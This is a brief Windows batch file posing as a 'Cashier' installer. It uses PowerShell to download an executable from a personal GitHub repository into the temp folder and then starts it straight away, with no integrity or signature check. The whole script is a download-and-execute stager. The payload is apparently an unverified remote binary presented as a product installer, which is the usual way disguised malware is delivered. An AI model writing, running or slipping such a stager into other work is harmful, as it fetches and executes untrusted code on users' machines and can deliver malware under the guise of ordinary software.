@echo off
title Cashier Installer

set url=https://github.com/zadelrahmanzad-boop/EH/raw/refs/heads/main/Cashier.exe
set file=%temp%\Cashier.exe

echo Downloading Cashier...
powershell -Command "Invoke-WebRequest '%url%' -OutFile '%file%'"

echo Starting Installer...
start "" "%file%"

exit